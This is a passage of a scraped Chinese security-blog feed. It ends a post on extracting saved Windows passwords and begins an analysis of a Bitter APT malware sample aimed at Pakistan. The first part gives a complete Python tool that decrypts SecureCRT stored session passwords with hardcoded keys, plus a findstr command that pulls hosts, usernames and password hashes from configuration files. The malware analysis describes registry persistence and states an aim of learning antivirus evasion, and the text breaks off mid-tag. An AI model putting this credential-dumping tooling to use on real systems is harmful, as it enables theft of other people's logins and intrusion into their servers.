class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, Blowfish</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureCRTCrypto</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Initialize SecureCRTCrypto object.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.IV = <span class="string">b&#x27;\x00&#x27;</span> * Blowfish.block_size</span><br><span class="line">        self.Key1 = <span class="string">b&#x27;\x24\xA6\x3D\xDE\x5B\xD3\xB3\x82\x9C\x7E\x06\xF4\x08\x16\xAA\x07&#x27;</span></span><br><span class="line">        self.Key2 = <span class="string">b&#x27;\x5F\xB0\x45\xA2\x94\x17\xD9\x16\xC6\xC6\xA2\xFF\x06\x41\x82\xB7&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">self, Plaintext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Encrypt plaintext and return corresponding ciphertext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Plaintext: A string that will be encrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Hexlified ciphertext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        plain_bytes = Plaintext.encode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line">        plain_bytes += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">        padded_plain_bytes = plain_bytes + os.urandom(Blowfish.block_size - <span class="built_in">len</span>(plain_bytes) % Blowfish.block_size)</span><br><span class="line"></span><br><span class="line">        cipher1 = Blowfish.new(self.Key1, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        cipher2 = Blowfish.new(self.Key2, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        <span class="keyword">return</span> cipher1.encrypt(os.urandom(<span class="number">4</span>) + cipher2.encrypt(padded_plain_bytes) + os.urandom(<span class="number">4</span>)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">self, Ciphertext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Decrypt ciphertext and return corresponding plaintext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Ciphertext: A hex string that will be decrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Plaintext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        cipher1 = Blowfish.new(self.Key1, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        cipher2 = Blowfish.new(self.Key2, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        ciphered_bytes = <span class="built_in">bytes</span>.fromhex(Ciphertext)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ciphered_bytes) &lt;= <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        padded_plain_bytes = cipher2.decrypt(cipher1.decrypt(ciphered_bytes)[<span class="number">4</span>:-<span class="number">4</span>])</span><br><span class="line">        </span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_plain_bytes), <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> padded_plain_bytes[i] == <span class="number">0</span> <span class="keyword">and</span> padded_plain_bytes[i + <span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        plain_bytes = padded_plain_bytes[<span class="number">0</span>:i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> plain_bytes.decode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">raise</span>(ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureCRTCryptoV2</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ConfigPassphrase : <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Initialize SecureCRTCryptoV2 object.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            ConfigPassphrase: The config passphrase that SecureCRT uses. Leave it empty if config passphrase is not set.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.IV = <span class="string">b&#x27;\x00&#x27;</span> * AES.block_size</span><br><span class="line">        self.Key = SHA256.new(ConfigPassphrase.encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">self, Plaintext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Encrypt plaintext and return corresponding ciphertext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Plaintext: A string that will be encrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Hexlified ciphertext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        plain_bytes = Plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes) &gt; <span class="number">0xffffffff</span>:</span><br><span class="line">            <span class="keyword">raise</span> OverflowError(<span class="string">&#x27;Plaintext is too long.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        plain_bytes = \</span><br><span class="line">            <span class="built_in">len</span>(plain_bytes).to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">            plain_bytes + \</span><br><span class="line">            SHA256.new(plain_bytes).digest()</span><br><span class="line">        padded_plain_bytes = \</span><br><span class="line">            plain_bytes + \</span><br><span class="line">            os.urandom(AES.block_size - <span class="built_in">len</span>(plain_bytes) % AES.block_size)</span><br><span class="line">        cipher = AES.new(self.Key, AES.MODE_CBC, iv = self.IV)</span><br><span class="line">        <span class="keyword">return</span> cipher.encrypt(padded_plain_bytes).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">self, Ciphertext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Decrypt ciphertext and return corresponding plaintext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Ciphertext: A hex string that will be decrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Plaintext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        cipher = AES.new(self.Key, AES.MODE_CBC, iv = self.IV)</span><br><span class="line">        padded_plain_bytes = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(Ciphertext))</span><br><span class="line">        </span><br><span class="line">        plain_bytes_length = <span class="built_in">int</span>.from_bytes(padded_plain_bytes[<span class="number">0</span>:<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        plain_bytes = padded_plain_bytes[<span class="number">4</span>:<span class="number">4</span> + plain_bytes_length]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes) != plain_bytes_length:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        plain_bytes_digest = padded_plain_bytes[<span class="number">4</span> + plain_bytes_length:<span class="number">4</span> + plain_bytes_length + SHA256.digest_size]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes_digest) != SHA256.digest_size:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> SHA256.new(plain_bytes).digest() != plain_bytes_digest:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> plain_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Help</span>():</span></span><br><span class="line">        print(<span class="string">&#x27;Usage:&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;    SecureCRTCipher.py &lt;enc|dec&gt; [-v2] [-p ConfigPassphrase] &lt;plaintext|ciphertext&gt;&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;    &lt;enc|dec&gt;              &quot;enc&quot; for encryption, &quot;dec&quot; for decryption.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;                           This parameter must be specified.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;    [-v2]                  Encrypt/Decrypt with &quot;Password V2&quot; algorithm.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;                           This parameter is optional.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;    [-p ConfigPassphrase]  The config passphrase that SecureCRT uses.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;                           This parameter is optional.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;    &lt;plaintext|ciphertext&gt; Plaintext string or ciphertext string.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;                           NOTICE: Ciphertext string must be a hex string.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;                           This parameter must be specified.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">EncryptionRoutine</span>(<span class="params">UseV2 : <span class="built_in">bool</span>, ConfigPassphrase : <span class="built_in">str</span>, Plaintext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> UseV2:</span><br><span class="line">                print(SecureCRTCryptoV2(ConfigPassphrase).Encrypt(Plaintext))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(SecureCRTCrypto().Encrypt(Plaintext))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">&#x27;Error: Failed to encrypt.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">DecryptionRoutine</span>(<span class="params">UseV2 : <span class="built_in">bool</span>, ConfigPassphrase : <span class="built_in">str</span>, Ciphertext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> UseV2:</span><br><span class="line">                print(SecureCRTCryptoV2(ConfigPassphrase).Decrypt(Ciphertext))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(SecureCRTCrypto().Decrypt(Ciphertext))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">&#x27;Error: Failed to decrypt.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Main</span>(<span class="params">argc : <span class="built_in">int</span>, argv : <span class="built_in">list</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">3</span> &lt;= argc <span class="keyword">and</span> argc &lt;= <span class="number">6</span>:</span><br><span class="line">            bUseV2 = <span class="literal">False</span></span><br><span class="line">            ConfigPassphrase = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> argv[<span class="number">1</span>].lower() == <span class="string">&#x27;enc&#x27;</span>:</span><br><span class="line">                bEncrypt = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> argv[<span class="number">1</span>].lower() == <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                bEncrypt = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Help()</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            i = <span class="number">2</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; argc - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> argv[i].lower() == <span class="string">&#x27;-v2&#x27;</span>:</span><br><span class="line">                    bUseV2 = <span class="literal">True</span></span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> argv[i].lower() == <span class="string">&#x27;-p&#x27;</span> <span class="keyword">and</span> i + <span class="number">1</span> &lt; argc - <span class="number">1</span>:</span><br><span class="line">                    ConfigPassphrase = argv[i + <span class="number">1</span>]</span><br><span class="line">                    i += <span class="number">2</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    Help()</span><br><span class="line">                    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> bUseV2 == <span class="literal">False</span> <span class="keyword">and</span> <span class="built_in">len</span>(ConfigPassphrase) != <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">&#x27;Error: ConfigPassphrase is not supported if &quot;-v2&quot; is not specified&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> bEncrypt:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> EncryptionRoutine(bUseV2, ConfigPassphrase, argv[-<span class="number">1</span>]) <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> DecryptionRoutine(bUseV2, ConfigPassphrase, argv[-<span class="number">1</span>]) <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Help()</span><br><span class="line"></span><br><span class="line">    exit(Main(<span class="built_in">len</span>(sys.argv), sys.argv))</span><br></pre></td></tr></table></figure><h4 id="8-X版本"><a href="#8-X版本" class="headerlink" title="8.X版本"></a>8.X版本</h4><p>进入目录提取文件中的连接IP、端口、账号、hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr &#x2F;si &#x2F;c:&quot;Hostname&quot; &#x2F;c:&quot;\&quot;Username\&quot;&#x3D;&quot; &#x2F;c:&quot;\&quot;Password V2\&quot;&#x3D;&quot; &#x2F;c:&quot;\&quot;[SSH2] Port\&quot;&#x3D;&quot; *.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/23.png" alt="image-20210611163435588"></p><p>然后使用上面脚本解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#注意去除hash的前面三位 &quot;02:&quot;</span><br><span class="line">python3  SecureCRT.py dec -v2 hash</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/24.png" alt="image-20210611163621590"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;redteam.today&#x2F;2019&#x2F;12&#x2F;09&#x2F;%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BAchrome%E5%AF%86%E7%A0%81&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;3gstudent.github.io&#x2F;%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tianhe1986&#x2F;FatSmallTools</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kinnisoy&#x2F;GetChromePassword</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dzxs&#x2F;Xdecrypt</span><br><span class="line">https:&#x2F;&#x2F;rcoil.me&#x2F;2019&#x2F;09&#x2F;%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Yang34&#x2F;p&#x2F;14237114.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>蔓灵花APT组织针对巴基斯坦定向攻击的样本分析</title>
    <link href="https://www.ascotbe.com/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/"/>
    <id>https://www.ascotbe.com/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/</id>
    <published>2021-05-18T15:45:42.000Z</published>
    <updated>2021-05-23T09:45:35.677Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>开个新坑，学习下样本分析看看有什么好的免杀技术能够让我整合的，第一篇文章就参考<a href="https://bbs.pediy.com/thread-249319.htm">Crazyman</a>师傅写文章的和网上各个沙箱的已有的内容</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/1.png" alt="image-20210519180644203" style="zoom: 50%;" /><blockquote><p>样本</p></blockquote><table><thead><tr><th align="left">文件类型</th><th align="left">PE32 executable (console) Intel 80386, for MS Windows</th></tr></thead><tbody><tr><td align="left">文件大小</td><td align="left">31KB</td></tr><tr><td align="left">MD5</td><td align="left">8d42c01180be7588a2a68ad96dd0cf85</td></tr><tr><td align="left">SHA1</td><td align="left">89a7861acb7983ad712ae9206131c96454a1b3d8</td></tr><tr><td align="left">SHA256</td><td align="left">0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0</td></tr><tr><td align="left">时间戳</td><td align="left">0x5C32FC2B (Mon Jan 07 15:13:47 2019)</td></tr><tr><td align="left">PDB</td><td align="left">c:\Users\Asterix\Documents\Visual Studio 2008\Projects\28NovDwn\Release\28NovDwn.pdb</td></tr><tr><td align="left">数据</td><td align="left"><a href="https://github.com/Ascotbe/SampleAnalysis/tree/master/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0">样本和IDA数据库下载</a></td></tr></tbody></table><blockquote><p>沙箱数据</p></blockquote><ul><li><p><a href="https://app.any.run/tasks/7ef05c98-a4d4-47ff-86e5-8386f8787224/">any.run</a></p></li><li><p><a href="https://www.virustotal.com/gui/file/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/details">virustotal</a></p></li><li><p><a href="https://s.threatbook.cn/report/file/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/?sign=history&env=win7_sp1_enx86_office2013">threatbook</a></p></li></ul><h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><p>先在前面放几个经常用到的文档和x64gdb相关插件</p><ul><li><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/s3f49ktz(v=vs.120)">数据类型范围</a></p></li><li><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/2e6a4at9%28v%3dvs.120%29">C++ 关键字</a></p></li><li><p><a href="https://github.com/horsicq/x64dbg-Plugin-Manager">X64DBG插件安装器</a></p></li><li><p><a href="https://github.com/bootleg/ret-sync">IDA和X64GDB联动</a></p></li><li><p>CSIDL values</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tarma.com&#x2F;support&#x2F;im9&#x2F;using&#x2F;symbols&#x2F;functions&#x2F;csidls.htm</span><br><span class="line">https:&#x2F;&#x2F;www.nirsoft.net&#x2F;articles&#x2F;find_special_folder_location.html</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;shell&#x2F;csidl</span><br></pre></td></tr></table></figure></li></ul><p>本文对样本静态和动态同步分析，样本拿来先丢到pestudio中看下数据，结果在里面看到了PDB的路径</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/2.png" alt="image-20210518154946052"></p><p>接着丢IDA中分析，首先找到WinMain函数，可以看到第9行有一个自定义函数<strong>sub_401140</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/3.png" alt="image-20210518170332795"></p><p>进入函数<strong>sub_401140</strong>可以看到就是一个注册窗口相关的，该函数第7行的<strong>sub_4011D0</strong>是用来处理窗口的</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/4.png" alt="image-20210518170458445"></p><p><strong>sub_4011D0</strong>内容如下</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/5.png" alt="image-20210518171307047"></p><p>接着我们回到WinMain函数，从第9行到第17行的内容看截图的注释就能明白了，我们重点看<strong>sub_401330</strong>函数，进入函数中看到281行和282行创建了<code>c:\\intel\\</code>路径</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/6.png" alt="image-20210519171938860"></p><p>接着往下看</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/7.png" alt="image-20210519172132691"></p><p>在332行中有个<strong>sub_403B00</strong>函数，函数大概的意思就是还是创建一个文件夹，下图是该函数的有用的内容</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/8.png" alt="image-20210519094603305"></p><p>339行的<strong>sub_401F00</strong>是一个注册列表函数，我们进到函数里面中分析</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/9.png" alt="image-20210519151517317"></p><p>接着动态调试到这个点时，看注册列表内容</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/10.png" alt="image-20210519160539252"></p><p>我们回到调用函数中继续跟</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/11.png" alt="image-20210523160455000"></p><p>接着到355行可以看到下图的动态调试结果，是打开了开机运行值中</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/12.png" alt="image-20210521173911417"></p><p>然后356行创建了一个多线程，运行的函数为<code>StartAddress</code> ，我们进入到该函数中查看，函数内容如下图</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/13.png" alt="image-20210523154624779"></p><p>可以看到是想从系统环境变量模块中获取到<code>ComSpec</code>的值，我们动态调试解出来是为<code>C:\\WINDOWS\\system32\\cmd.exe</code></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/14.png" alt="image-20210523152111955"></p><p>然后我们找一台正常的机器来看看是否是都是这个值</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/15.png" 